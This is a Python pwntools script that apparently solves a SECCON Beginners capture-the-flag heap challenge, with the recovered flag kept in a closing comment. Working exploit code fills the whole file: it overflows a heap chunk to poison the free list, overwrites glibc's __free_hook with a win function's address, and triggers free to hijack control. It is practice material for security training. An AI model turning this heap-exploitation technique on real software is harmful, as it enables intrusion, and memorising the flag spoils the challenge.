from pwn import *


def menu():
    # print(io.recvuntil(b'hint\n> '))
    io.recvuntil(b'hint\n> ')

# context.log_level = "DEBUG"

io = remote('bh.quals.beginners.seccon.jp', 9002)


io.recvuntil(b'hook>: ')
addr_free_hook = int(io.recvline(), 16)
io.recvuntil(b'win>: ')
addr_win = int(io.recvline(), 16)

print('addr_free_hook: 0x{:x}'.format(addr_free_hook))
print('addr_win: 0x{:x}'.format(addr_win))


menu()
print('b = malloc()')
io.sendline(b'2')
io.sendline(b'A')

print('free(B)')
menu()
io.sendline(b'3')

print('overwrite next')
menu()
io.sendline(b'1')
io.sendline(b'A' * 0x18 + p64(0x31) + p64(addr_free_hook))

print('consume')
menu()
io.sendline(b'2')
io.sendline(b'consume')

print('empty B')
menu()
io.sendline(b'3')

print('overwrite free hook')
menu()
io.sendline(b'2')
io.sendline(p64(addr_win))

print('free')
menu()
io.sendline(b'3')


io.interactive()


# ctf4b{l1bc_m4ll0c_h34p_0v3rfl0w_b4s1cs}
